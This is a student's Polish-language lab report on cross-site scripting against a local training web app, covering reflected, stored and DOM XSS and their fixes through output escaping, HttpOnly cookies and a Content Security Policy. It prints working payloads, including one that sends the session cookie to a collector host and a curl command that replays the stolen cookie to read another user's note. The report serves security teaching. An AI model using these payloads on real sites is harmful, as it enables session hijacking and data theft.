# Raport - Laboratorium 6: Cross-Site Scripting (XSS)

**Imię i nazwisko:** Franciszek Kwiatkowski
**Numer indeksu:** 337582

Szczegółowe ładunki, polecenia i logi: `zadanie6/dowody.md`.
Poprawiona aplikacja: `zadanie6/pliki-dla-studentow/aplikacja/`.

---

## Zadanie 1 - XSS odbity

- **Adres z ładunkiem:** `/szukaj?q=<script>document.body.style.background='red';document.title='XSS-odbity'</script>` (w URL zakodowany).
- **Wiersz z błędem:** `app.py` wiersz 48 (trasa `/szukaj`) - `fraza` doklejana do HTML bez kodowania.
- **PRZED:** `...dla: <script>...</script>` - skrypt wykonany (czerwone tło, tytuł `XSS-odbity`).
- **PO:** `...dla: &lt;script&gt;...&lt;/script&gt;` - wyświetlony jako tekst; `/szukaj?q=konsultacje` nadal znajduje ogłoszenie.
- **Poprawka:** `escape(fraza)` z modułu `html`.
- **Wniosek:** Kodowanie wyjścia jest lepsze niż usuwanie słowa `script`, bo neutralizuje dowolny kontekst (np. `onerror`, `<img>`, wielkość liter), a czarna lista słów zawsze pozostawia obejścia i psuje legalne treści.

## Zadanie 2 - XSS zapisany i przejęcie sesji

- **Ładunek:** `<img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">`.
- **Zbieracz PRZED:** `ZEBRANO: /?c=session=eyJ1enl0a...RkZ5o` (token czytelny dla skryptu).
- **Zbieracz PO:** `ZEBRANO: /?c=` (puste - HttpOnly blokuje odczyt).
- **Krok 3:** `curl.exe -i -b "session=eyJ1enl0a...RkZ5o" http://127.0.0.1:8080/notatka` zwrócił **prywatną notatkę Anny** - sesja przejęta bez hasła.
- **Set-Cookie PRZED:** `session=eyJ1enl0a...RkZ5o; Path=/`
- **Set-Cookie PO:** `session=eyJ1enl0a...Nf2q1; HttpOnly; Path=/`
- **Poprawka:** `app.config["SESSION_COOKIE_HTTPONLY"] = True` (`app.py` wiersz 11).
- **Wniosek:** HttpOnly nie usuwa podatności XSS - skrypt wciąż działa w kontekście ofiary (może zmieniać stronę i słać żądania z jej sesją); blokuje tylko odczyt ciasteczka przez `document.cookie`.

## Zadanie 3 - Naprawa i Content Security Policy

| Ładunek | PRZED naprawą | PO naprawie |
|---|---|---|
| odbity | skrypt wykonany (tło/tytuł) | tekst |
| zapisany | skrypt wykonany, kradzież ciasteczka | tekst; CSP blokuje inline i wysyłkę |
| DOM `/podglad#<img onerror=...>` | `onerror` wykonany, tytuł `XSS-DOM` | tekst przez `textContent` |

- Przywrócono kodowanie w `templates/tablica.html` (usunięto `|safe`).
- Skrypt `/podglad` przeniesiony do `static/podglad.js`, `innerHTML` → `textContent`.
- **Nagłówek CSP:** `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'` (dekorator `@app.after_request`).
- **Test tekstu:** `Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'` wyświetla się dosłownie; podgląd pokazuje zwykły tekst.
- **Wniosek:** CSP jest dodatkową warstwą, a nie zamiennikiem kodowania wyjścia - samo kodowanie usuwa przyczynę (dane interpretowane jako kod), a CSP ogranicza skutki, gdy gdzieś zostanie luka; przy samym CSP wyciek danych do innego miejsca tego samego originu nadal jest możliwy.
